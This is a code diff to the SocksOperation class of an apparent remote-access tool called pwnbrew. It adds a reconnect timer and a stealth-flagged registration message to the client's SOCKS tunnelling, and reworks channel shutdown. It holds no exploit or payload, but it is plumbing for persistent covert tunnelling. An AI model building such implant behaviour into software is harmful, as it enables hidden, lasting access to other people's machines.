@@ -47,14 +47,17 @@ package pwnbrew.network.control.messages;
 
 import pwnbrew.ClientConfig;
 import pwnbrew.manager.ConnectionManager;
+import pwnbrew.manager.OutgoingConnectionManager;
 import pwnbrew.manager.PortManager;
 import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.ControlOption;
 import pwnbrew.network.PortRouter;
+import pwnbrew.network.RegisterMessage;
 import pwnbrew.selector.SocketChannelHandler;
 import pwnbrew.socks.SocksConnectionCallback;
 import pwnbrew.socks.SocksMessageManager;
 import pwnbrew.utilities.DebugPrinter;
+import pwnbrew.utilities.ReconnectTimer;
 import pwnbrew.utilities.SocketUtilities;
 
 /**
@@ -169,10 +172,24 @@ public final class SocksOperation extends ControlMessage {
             //Get the port router
             ClientPortRouter aPR = (ClientPortRouter) passedManager.getPortRouter( socketPort );
             int theClientId = getSrcHostId();
+            
+            //Create the Timer
+            OutgoingConnectionManager theOCM = aPR.getConnectionManager();
+            int newChannelId = theOCM.getNextChannelId();
+            ReconnectTimer aReconnectTimer = new ReconnectTimer(passedManager, newChannelId); 
+            byte stlth_val = 0;
+            if( theConf.useStealth() )
+                stlth_val = 1;   
+
+            //Queue register message
+            RegisterMessage aMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, newChannelId);
+            aReconnectTimer.setPostConnectMessage(aMsg);
 
             //Create the shell callback
-            SocksConnectionCallback aSCC = new SocksConnectionCallback(serverIp, socketPort, passedManager, theClientId );
-            aPR.ensureConnectivity( aSCC ); 
+            SocksConnectionCallback aSCC = new SocksConnectionCallback(serverIp, socketPort, passedManager, theClientId, aReconnectTimer );
+            //aPR.ensureConnectivity( aSCC ); 
+            aReconnectTimer.setConnectionCallback(aSCC);
+            aReconnectTimer.start();  
             
         } else if( theSocksOperation == SOCKS_STOP ){
             
@@ -194,12 +211,20 @@ public final class SocksOperation extends ControlMessage {
             PortRouter aPR = passedManager.getPortRouter(aConf.getSocketPort());
             if( aPR != null && aPR instanceof ClientPortRouter){
                 ClientPortRouter aCPR = (ClientPortRouter)aPR;
-                ConnectionManager aCM = aCPR.getConnectionManager();
-                SocketChannelHandler aSCH = aCM.getSocketChannelHandler(theHandlerId);
-                if( aSCH != null ){
-                    aSCH.shutdown();
-                    aCPR.socketClosed(getSrcHostId(), theHandlerId);
+                OutgoingConnectionManager aCM = aCPR.getConnectionManager();
+                
+                //Disable reconnect timer
+                ReconnectTimer aRT = aCM.getReconnectTimer(theHandlerId);
+                if( aRT != null ){
+                    aRT.setEnabled(false);
+                    aRT.shutdown();
                 }
+                
+//                SocketChannelHandler aSCH = aCM.getSocketChannelHandler(theHandlerId);
+//                if( aSCH != null ){
+//                    aSCH.shutdown();
+//                    aCPR.socketClosed(getSrcHostId(), theHandlerId);
+//                }
             }
         
         }
